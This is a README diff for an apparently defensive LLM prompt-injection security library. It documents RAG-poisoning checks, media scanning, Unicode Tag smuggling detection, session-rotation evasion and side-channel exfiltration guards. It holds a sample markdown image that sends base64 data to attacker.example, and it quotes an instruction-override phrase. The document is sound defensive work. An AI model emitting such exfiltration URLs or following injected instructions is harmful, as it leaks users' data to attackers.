@@ -187,6 +187,32 @@ demonstration. Call `await pipeline.aclose()` on shutdown.
 Tests live in `tests/` and run with pytest (`asyncio_mode = "auto"`, see
 `pyproject.toml`):
 
+- `test_redis_cluster_keys.py` – the Redis Cluster key layout: slot
+  invariants computed locally (no server needed) plus, when a
+  cluster-enabled Redis is reachable at `REDIS_CLUSTER_URL`, the same
+  operations against a real one — including a test that the *old* key
+  layout is genuinely rejected, so the hash tags can't quietly stop
+  being load-bearing.
+- `test_risk_weights.py` – the scoring knobs, including a measured
+  demonstration of the recall/false-positive trade they control.
+- `test_identity_binding.py` – token subject binding, principal-keyed
+  session state, and the actor accumulator. Includes a test that documents
+  the residual gap: with no principal and no actor id, rotating the session
+  id defeats cumulative risk entirely.
+- `test_ingest_guard.py` – ingest verdicts, trust tiers, and provenance:
+  in particular that content modified *after* a clean ingest is detected at
+  retrieval, and that "never ingested" is reported differently from
+  "tampered".
+- `test_media_guard.py` – the extractor seam: plugged-in output is scanned
+  like ordinary text, a failing extractor degrades visibly rather than
+  reporting clean, and media risk feeds the same session budget as text.
+- `test_evaluation.py` – the threshold sweep and shadow mode.
+- `test_exfil_guard.py` – side-channel URL detection: zero-click channels,
+  payload shapes, allowlist behaviour, and the pipeline wiring for both
+  output and tool arguments.
+- `test_unicode_smuggling.py` – Unicode Tag-block and bidi handling,
+  including that the hidden run reaches the lexical scan and is gone from
+  the text handed to the model.
 - `test_in_memory_stores.py` – plain unit tests for
   `InMemoryNonceStore`/`InMemorySessionStore`: no infrastructure, no
   `ProcessPoolExecutor`, just the single-process logic they're actually
@@ -251,6 +277,43 @@ in-memory stores.
   (`EVAL`/Lua scripting is core functionality). Use a dedicated logical DB
   or key prefix per environment to avoid staging/prod key collisions —
   `RedisNonceStore`/`RedisSessionStore` accept a `key_prefix` argument.
+- **Redis Cluster**: supported, and it needs no configuration.
+
+  ```python
+  backend = RedisStateBackend.from_cluster_url("redis://redis-cluster:6379")
+  # or pass a RedisCluster client you already manage:
+  backend = RedisStateBackend(my_cluster_client)
+  ```
+
+  The reason this needs handling at all: a cluster shards the keyspace into
+  16384 hash slots, and a Lua script may only touch keys in one slot.
+  `add_risk` updates `risk`, `risk_last` and `flagged` together, so under
+  plain `prefix:<session_id>:<field>` naming the server rejects the call
+  with CROSSSLOT before executing anything. Session keys are therefore
+  wrapped in a hash tag — `sentinel:session:{<session_id>}:risk` — which
+  pins one session's keys to one slot while spreading sessions across the
+  cluster. The topology is detected on first use (`INFO cluster`, or free
+  of charge when the client is already a `RedisCluster`) and cached, so a
+  single-node deployment keeps its existing key layout and a cluster gets
+  tagged keys, with the same code either way.
+
+  Overrides, for the cases where detection is not what you want:
+  `hash_tags=True` (always tag — valid on a single node too, since braces
+  are ordinary characters there) or `hash_tags=False` (never tag; raises at
+  first use if the client is a cluster client, rather than letting a
+  CROSSSLOT surface later inside the guard path). If `INFO` is restricted
+  by your provider, detection logs a warning and tags, because tagged keys
+  are correct on both topologies.
+
+  Two things to know before switching an existing deployment: keys change
+  name, so in-flight session counters and risk scores start from zero once
+  (all of it is TTL'd ephemeral state — nonce keys are deliberately *not*
+  renamed, so anti-replay is unaffected); and `key_prefix` must no longer
+  contain braces, which is rejected at construction. A brace in the prefix
+  is the first brace group in the key and would beat the per-session tag,
+  collapsing every session into one slot. If you applied the manual
+  `{session_id}`-in-`key_prefix` workaround this README previously
+  suggested, remove it.
 - **Connection reuse**: pass one shared `redis.asyncio.Redis` client (which
   manages its own connection pool) to `RedisStateBackend(redis_client)`
   rather than letting every request open a new connection.
@@ -329,16 +392,316 @@ See the module docstring in `config_loader.py` for the exact schema.
 - Secret/PII/system-prompt leakage in model output
 - DoS/cost-abuse via excessive requests or tool calls (session budget)
 - Multi-turn jailbreak build-up (cumulative session risk)
+- Exfiltration through rendered side channels — markdown/HTML image and
+  media URLs, CSS `url()`, and URLs passed as tool-call arguments
+- Instructions smuggled in invisible codepoints (Unicode Tags block,
+  directional overrides)
 - **Correctness of all of the above under multi-process/multi-pod
-  deployment** (this revision's focus)
+  deployment**
+
+- Knowledge-base/RAG poisoning at ingestion, with provenance verification
+  at retrieval
+- Non-text carriers, through pluggable extractors (metadata and embedded
+  strings out of the box; OCR is yours to supply)
+
+- Binding tokens and session state to an authenticated end user, when your
+  gateway supplies one, plus risk accumulation that survives session
+  rotation when it does not
 
 **Still NOT covered:**
-- Data poisoning of a knowledge base/RAG index at ingestion time
-- Exfiltration via secondary channels (e.g. rendered markdown image URLs)
-- Non-text jailbreak vectors (e.g. hidden text in images)
-- End-user authentication/authorization upstream of the agent
-- Any guarantee against a sufficiently novel/creative attack — heuristics
-  and thresholds need tuning and red-teaming against your specific agent
+- **Authenticating anyone.** The library receives a principal, it cannot
+  verify one. That belongs at your gateway and no future version will
+  change it — see *Identity* below for exactly where the boundary falls.
+- **Object-level authorization.** Whether account 42 belongs to this user
+  is a question about your data model. The library transports and verifies
+  signed constraints; the policy stays in your tool.
+- Text rendered as pixels, unless you plug in OCR. See *Non-text input*.
+- Any guarantee against a sufficiently novel attack. No code produces one.
+  What the library now provides instead is the means to measure: see
+  *Tuning the thresholds*.
+
+### Identity
+
+`session_id` is a string the caller supplies. Nothing here can verify it,
+and that has a sharp consequence: rotating it resets the cumulative risk
+score, so the multi-turn defence is worth exactly as much as that string
+is hard to change. Every other omission in this library fails loudly — a
+missing provenance store raises, a cluster with the wrong key layout
+raises — this one degrades in silence, with counters counting and logs
+filling up while protecting nothing.
+
+So the posture has to be declared. Leaving it undeclared logs a warning at
+construction.
+
+```python
+# You have a gateway that authenticates users
+pipeline = SecurityPipeline(session_identity="authenticated")
+await pipeline.pre_process(msg, session_id=sid, principal=user_id)
+
+# You do not — accept it knowingly, and give risk somewhere stable to land
+pipeline = SecurityPipeline(session_identity="untrusted")
+await pipeline.pre_process(msg, session_id=sid, actor_id=api_key_id)
+```
+
+**What a principal buys you.** Session state is keyed to it, so guessing
+someone's `session_id` inherits none of their budget or accumulated risk.
+Capability tokens are issued with a `subject` inside the signature and can
+only be spent by that subject, which is what makes a leaked token useless
+to whoever finds it — the confused-deputy case, where the agent acts with
+the token's authority regardless of who is asking now. Under this posture
+unbound tokens are refused at issuance. The audit trail records the
+principal, so incident response does not depend on a join through an
+unverifiable key.
+
+**What an `actor_id` buys you without any of that.** A second, coarser
+accumulator — account, API key, tenant, source address — with a higher
+threshold and a longer TTL. It does not need to be unforgeable; it only
+needs to be more expensive to change than the session id. Without one,
+`tests/test_identity_binding.py` demonstrates the evasion: ten identical
+attacks across ten fresh session ids, none blocked. With one, the same
+sequence trips the actor threshold.
+
+**Object-level scope** is where the library stops. It can carry signed
+constraints and check them for you:
+
+```python
+token = guard.issue_token(agent_id="bot", scopes=["read_crm"],
+                          subject=user_id, constraints={"account_id": "42"})
+guard.check_constraints(token, account_id=requested_account)   # raises on mismatch
+```
+
+That answers "does this call match what the token was issued for", which
+is cryptographic and therefore ours. It does not answer "should this user
+be near account 42", which is your data model and stays in your tool.
+
+### Ingestion-time scanning (`IngestGuard`)
+
+`pre_process_external` scans retrieved content at query time, which is the
+right last line of defence and the wrong place to catch poisoning. By then
+the malicious chunk is indexed, returned for every similar query, and
+rescanned on every retrieval — and retrieval-time scanning only ever sees
+the top-k that came back, so a document planted months ago and surfacing
+for one specific question is never examined until the day it works.
+
+```python
+verdict = await pipeline.ingest_document(
+    page_text, document_id="wiki:1024", source_id="scraped:example.com", trust="untrusted",
+)
+if verdict.accepted:
+    index.add(page_text, metadata={"document_id": "wiki:1024"})
+else:
+    review_queue.put(verdict)          # "quarantine" or "reject"
+```
+
+Three things this adds over running the sanitizer earlier by hand. It
+produces a **verdict** (accept / quarantine / reject) rather than
+sanitizing and continuing, because at ingest nothing is waiting on the
+answer. It applies **trust tiers**, so a curated wiki and a scraped forum
+thread are not held to one threshold — the untrusted tier quarantines on a
+single injection phrase, which would be far too twitchy at runtime and is
+close to free at ingest. And it records **provenance**:
+
+```python
+check = await pipeline.verify_retrieved(chunk_text, document_id="wiki:1024")
+if check.tampered:      # content changed since it was approved
+    ...
+```
+
+That last one catches what scanning cannot: content that was clean when
+indexed and was modified afterwards, in the vector store, by someone who
+already has write access to it. It needs a `ProvenanceStore`, and all
+three ready-made backends provide one — Redis, PostgreSQL and MySQL — with
+`InMemoryProvenanceStore` for a single process and a three-method
+interface for anything else. It is not defaulted to in-memory on purpose:
+a provenance store that forgets on restart turns verified retrievals into
+unverified ones with nothing failing.
+
+Provenance rows are the one piece of state here without a TTL. Every other
+table is an expiring counter; a provenance record has to outlive whatever
+session retrieved the document, because an expired record is
+indistinguishable from a document that was never scanned. Deleting one
+belongs with deleting the document from your index.
+
+Batch ingestion (`ingest_batch`) parallelizes scanning across the process
+pool on the same terms as `pre_process_external_batch`.
+
+### Non-text input (`MediaScanner`)
+
+No OCR engine is bundled, and that is a considered choice rather than a
+gap left for later. Tesseract would add tens of megabytes and a per-image
+CPU cost, and would still miss the low-contrast, rotated and stylised text
+this attack actually uses — producing a guard that reports "clean" on
+exactly the inputs it is least able to read. That is worse than no guard,
+because it is a guard people trust.
+
+So extraction is yours and scoring is ours:
+
+```python
+scanner = MediaScanner(extractors=[
+    BinaryStringsExtractor(),                      # bundled, no dependencies
+    ExifExtractor(),                               # bundled, needs [images]
+    CallableExtractor("vision", my_vision_client), # yours
+])
+result = await pipeline.pre_process_media(image_bytes, "image/png", "upload:42", session_id=sid)
+```
+
+Synchronous extractors run on a thread pool rather than on the event loop
+— including a synchronous callable wrapped in `CallableExtractor`, which
+is async on the outside and would otherwise stall every other request in
+the process while it decodes. Pass `executor=` to bound how many images
+are decoded at once. Anything an extractor returns goes through the
+ordinary sanitizer, scores on the same scale, and feeds the same
+cumulative session risk — so an
+attack split across a message and an image does not get two independent
+budgets. A failing extractor is recorded in `extractor_errors` and the
+others still run; a scan where everything failed reports 0.0 *with the
+errors attached*, because "nothing was read" and "nothing was there" must
+not look alike.
+
+### Tuning the thresholds
+
+Every number in this library is a default chosen to be reasonable across
+agents in general, which means it is wrong for yours in some direction.
+`llm_security_pipeline.evaluation` is the instrument for finding out which:
+
+```python
+from llm_security_pipeline.evaluation import Evaluator, load_samples
+
+evaluator = Evaluator()
+samples = load_samples("corpus.jsonl")     # {"text": ..., "label": "attack"|"benign"}
+print(evaluator.report(samples))           # precision/recall/FPR per threshold
+missed, false_alarms = evaluator.misclassified(samples, threshold=0.6)
+best = evaluator.recommend(samples, max_false_positive_rate=0.01)
+```
+
+`recommend` optimizes for recall within a false-positive budget rather
+than for F1, deliberately: a false positive is a blocked customer and a
+false negative is a breach, and no single number knows the exchange rate
+between those for your product. Stating an acceptable false-positive rate
+is a decision an operator can actually reason about.
+
+**Run it before you trust the defaults.** Doing exactly that surfaced
+something worth knowing: at the default `input_risk_threshold=0.6`, a
+plain single-phrase direct injection scores 0.25 and does *not* block. That
+is consistent with the design — lexical matching is a supporting signal,
+the structural `wrap_as_data` boundary is the actual defence, and
+cumulative session risk catches the repeat offender — but it surprises
+people who expected single-turn lexical blocking.
+
+The weights that produce that score are configurable:
+
+```python
+from llm_security_pipeline import RiskWeights, Sanitizer
+
+pipeline = SecurityPipeline(
+    sanitizer=Sanitizer(weights=RiskWeights(per_pattern=0.6)),   # blocks on one match
+)
+```
+
+`RiskWeights` exposes every contribution — per lexical match and its cap,
+encoded payload, hidden text, bidi override, code-mixing. Raising
+`per_pattern` buys single-turn blocking and costs false positives on text
+that legitimately quotes instructions ("translate 'ignore the previous
+message'", "how does prompt injection work"); `tests/test_risk_weights.py`
+measures that trade rather than asserting it. Note also that the score is
+quantized in steps of `per_pattern`, so with the default of 0.25 every
+threshold between 0.25 and 0.4 behaves identically.
+
+A bundled `smoke_corpus()` exercises each detector and is sized to notice a
+regression, not to produce a score. Anyone quoting numbers from it as a
+benchmark has misread what it is.
+
+### Shadow mode
+
+Calibrating against real traffic requires running the guards over real
+traffic, which is not something you can do for the first time in
+enforcing mode:
+
+```python
+pipeline = SecurityPipeline(enforcement="shadow")
+result = await pipeline.pre_process(user_message)
+result.blocked        # always False
+result.would_block    # what enforcement would have done
+```
+
+Everything is scanned, scored and audited; nothing is blocked or even
+redacted, because the point is to observe the system as it behaves today
+rather than a partially-mitigated version of it. Rate-limit counters keep
+incrementing — a shadow deployment that stops counting is not measuring
+the same system — but going over budget is recorded on
+`result.rate_limited` instead of raised.
+
+### Side-channel exfiltration (`ExfilGuard`)
+
+The output guard redacts secrets it recognises. That does nothing about a
+model — following an instruction injected into a retrieved page — encoding
+data the user is entitled to see into a URL the client fetches on render:
+
+```
+![](https://attacker.example/p.png?d=c2stbGl2ZS1hYmMxMjM)
+```
+
+No click, nothing visible in the conversation, and the payload arrives in
+the attacker's access log. `ExfilGuard` classifies every URL it finds by
+two properties: whether the renderer fetches it without user action
+(images, iframes, media sources, `srcset`, `poster`, CSS `url()`) and
+whether it is shaped like it is carrying data (long or high-entropy
+path/query segments, base64/hex blobs, embedded credentials, `data:`
+URIs). Auto-fetch plus a payload shape blocks the response; a
+click-required link with a payload shape has its destination stripped and
+the message kept. `neutralized_text` always has the suspicious URLs
+removed, so a caller that ignores `blocked` still gets the mitigation.
+
+It runs by default. Give it an allowlist to make it a real control:
+
+```python
+pipeline = SecurityPipeline(
+    exfil_allowed_hosts=["cdn.mycorp.com", "mycorp.com"],  # subdomains included
+)
+```
+
+Without one, the guard has to infer intent from URL shape, and `?w=800` on
+a CDN image is not distinguishable from a one-character channel. With one,
+any auto-fetching URL pointing elsewhere is a finding regardless of shape
+— the only version of this defence that holds against an attacker who
+pads the payload to look ordinary.
+
+Tool-call arguments are scanned too, on the same rules: an agent talked
+into `http_get(url=...)` exfiltrates just as well as one that emits an
+image tag, and that path never reaches `post_process`.
+
+The two integration points have separate switches, both defaulting on,
+because they differ in blast radius — one rewrites a reply, the other
+refuses an action:
+
+```python
+SecurityPipeline(
+    scan_output_for_exfil=False,      # leave generated text alone
+    scan_tool_call_arguments=False,   # leave tool arguments alone
+)
+```
+
+With output scanning off, `PostProcessResult.exfil` is `None` and the text
+is passed through as the output guard left it; secret redaction is
+unaffected.
+
+### Invisible-codepoint smuggling
+
+Every printable ASCII character has a counterpart in the Unicode Tags
+block (U+E0000–U+E007F) that renders as nothing and passes through NFKC
+untouched. An entire instruction can therefore sit inside a string that
+looks ordinary to whoever reviews it and tokenizes normally for the model.
+`normalize_text` now strips the block, and the sanitizer decodes the
+hidden run first and puts it through the same lexical scan as visible
+text, so `[hidden] <pattern>` shows up in `matched_patterns` and the
+decoded message is preserved in `hidden_text_hits` for the audit trail.
+
+The presence of hidden text scores as heavily as an encoded payload and is
+deliberately not conditioned on what it says: text written to be
+unreadable by the human in the loop is hostile by construction. Bidi
+overrides (U+202D/U+202E) are stripped and scored; embeddings and isolates
+are stripped silently, since they occur in ordinary mixed RTL/LTR text,
+as do the variation selectors used for emoji presentation.
 
 ## Important design choices (read before integrating)
 
@@ -364,12 +727,11 @@ See the module docstring in `config_loader.py` for the exact schema.
 
 - Lexical pattern lists cover 6 common languages; extend based on your
   real user base.
-- The Lua scripts assume a single Redis node/primary (standard for
-  ElastiCache/Memorystore-style managed Redis). A Redis Cluster deployment
-  needs the keys touched together by a script (`risk`, `risk_last`,
-  `flagged`) to hash to the same slot — the default key naming does not
-  guarantee this; use Redis Cluster hash tags (`{session_id}`) in
-  `key_prefix` if you deploy on a cluster.
+- Redis Cluster is supported (see *Deployment notes*), but a session's
+  counters live in one slot by construction, so a single very hot session
+  is served by a single shard. This is inherent to keeping the risk update
+  atomic; sessions spread evenly across the cluster, individual sessions do
+  not spread at all.
 - The SQL backends emulate TTL with `expires_at` columns: expiry is
   enforced logically in every query (correctness never depends on
   cleanup), but physical row deletion is opportunistic — if you need
